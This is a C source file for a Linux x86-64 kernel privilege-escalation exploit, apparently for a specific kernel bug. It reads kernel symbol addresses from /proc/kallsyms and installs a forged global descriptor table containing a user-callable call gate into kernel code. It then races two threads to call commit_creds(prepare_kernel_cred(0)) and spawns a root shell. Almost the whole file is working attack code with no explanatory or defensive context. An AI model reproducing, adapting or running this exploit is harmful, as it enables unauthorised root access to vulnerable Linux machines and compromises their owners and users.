#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

extern void lgdt_thread(void);
extern void *patch_thread(void*);
extern void callgate_callback(void);

/* from arch/x86/include/asm/desc_defs.h - kernel 4.5.1 */
struct desc_ptr {
    unsigned short size;
    unsigned long address;
} __attribute__((packed)) ;

struct desc_struct {
    union {
        struct {
            unsigned int a;
            unsigned int b;
        };
        struct {
            unsigned short limit0;
            unsigned short base0;
            unsigned int base1: 8, type: 4, s: 1, dpl: 2, p: 1;
            unsigned int limit: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;
        };
    };
} __attribute__((packed));

/* 16 bytes gate */
struct gate_struct64 {
    unsigned short offset_low;
    unsigned short segment;
    unsigned char zero0;
    unsigned int type : 5, dpl : 2, p : 1;
    unsigned short offset_middle;
    unsigned int offset_high;
    unsigned int zero1;
} __attribute__((packed));

#define GDT_ENTRIES                     16
#define GDT_ENTRY_KERNEL32_CS           1
#define GDT_ENTRY_KERNEL_CS             2
#define GDT_ENTRY_KERNEL_DS             3
#define GDT_ENTRY_DEFAULT_USER32_CS     4
#define GDT_ENTRY_DEFAULT_USER_DS       5
#define GDT_ENTRY_DEFAULT_USER_CS       6
#define GDT_ENTRY_CALLGATE              7
// 16 bytes - two entries

#define GDT_ENTRY_INIT(gdt, number, flags, base, limit) \
    gdt[number].a = ((limit) & 0xffff) | (((base) & 0xffff) << 16); \
    gdt[number].b = (((base) & 0xff0000) >> 16) | (((flags) & 0xf0ff) << 8) | ((limit) & 0xf0000) | ((base) & 0xff000000);

#define CALLGATE_INIT(callgate, seg, offset, ddpl) \
    callgate.offset_low = (offset & 0xffff); \
    callgate.offset_middle = ((offset >> 16) & 0xffff); \
    callgate.offset_high = ((offset >> 32) & 0xffffffff); \
    callgate.segment = seg; \
    callgate.dpl = ddpl; \
    callgate.type = 12; \
    callgate.p = 1; \
    callgate.zero0 = 0; \
    callgate.zero1 = 0; \

struct desc_struct gdt[GDT_ENTRIES];
struct desc_ptr old_gdtr = {0, 0};
struct desc_ptr new_gdtr = {sizeof(gdt)-1, (unsigned long) gdt};

typedef struct cred *(*prepare_kernel_cred_t) (void *) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (void *) __attribute__((regparm(3)));
prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t) NULL;
commit_creds_t commit_creds = (commit_creds_t) NULL;

void *get_addr_kallsyms(char *name)
{
    FILE *kallsyms;
    int fscanf_ret = 0;
    void *addr = NULL;
    char bla;
    char sym_name[256];
    void *ret = NULL;

    kallsyms = fopen("/proc/kallsyms", "r");
    if(kallsyms == NULL)
    {
        perror("fopen kallsyms");
        return NULL;
    }

    do
    {
        fscanf_ret = fscanf(kallsyms, "%p %c %s\n", &addr, &bla, sym_name);
        if(fscanf_ret == 0)
        {
            fscanf(kallsyms, "%s\n", sym_name);
        }
        else if(strcmp(name, sym_name) == 0)
        {
            ret = addr;
            break;
        }

    } while(fscanf_ret != EOF);

    return ret;
}

void get_root()
{
    commit_creds(prepare_kernel_cred(0));
}

void *lgdt_stub(void *ptr)
{
    lgdt_thread();

    if(geteuid() == 0)
    {
        printf("root!\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("failed.\n");
    }

    return NULL;
}

int main(int argc, char const *argv[])
{
    pthread_t lgdt;
    pthread_t patch;
    void *lgdt_ret;
    void *patch_ret;
    struct gate_struct64 callgate;

    commit_creds = get_addr_kallsyms("commit_creds");
    prepare_kernel_cred = get_addr_kallsyms("prepare_kernel_cred");

    printf("commit_creds = %p\n", commit_creds);
    printf("prepare_kernel_cred = %p\n", prepare_kernel_cred);

    memset(gdt, '\0', sizeof(gdt));
    // 0x00
    GDT_ENTRY_INIT(gdt, 0, 0, 0, 0);
    // 0x08
    GDT_ENTRY_INIT(gdt, GDT_ENTRY_KERNEL32_CS, 0xc09b, 0, 0xfffff);
    // 0x10
    GDT_ENTRY_INIT(gdt, GDT_ENTRY_KERNEL_CS, 0xa09b, 0, 0xfffff);
    // 0x18
    GDT_ENTRY_INIT(gdt, GDT_ENTRY_KERNEL_DS, 0xc093, 0, 0xfffff);
    // 0x20
    GDT_ENTRY_INIT(gdt, GDT_ENTRY_DEFAULT_USER32_CS, 0xc0fb, 0, 0xfffff);
    // 0x28
    GDT_ENTRY_INIT(gdt, GDT_ENTRY_DEFAULT_USER_DS, 0xc0f3, 0, 0xfffff);
    // 0x30
    GDT_ENTRY_INIT(gdt, GDT_ENTRY_DEFAULT_USER_CS, 0xa0fb, 0, 0xfffff);
    // 0x38
    CALLGATE_INIT(
        callgate,
        0x10,
        (unsigned long) callgate_callback,  // offset
        3                                   // dpl (user)
    );
    memcpy(&gdt[GDT_ENTRY_CALLGATE], &callgate, sizeof(struct gate_struct64));

    if(pthread_create(&lgdt, NULL, lgdt_stub, NULL))
    {
        perror("lgdt thread\n");
        return EXIT_FAILURE;
    }

    if(pthread_create(&patch, NULL, patch_thread, NULL))
    {
        perror("patch thread\n");
        return EXIT_FAILURE;
    }

    pthread_join(lgdt, &lgdt_ret);
    pthread_join(patch, &patch_ret);

    return EXIT_SUCCESS;
}
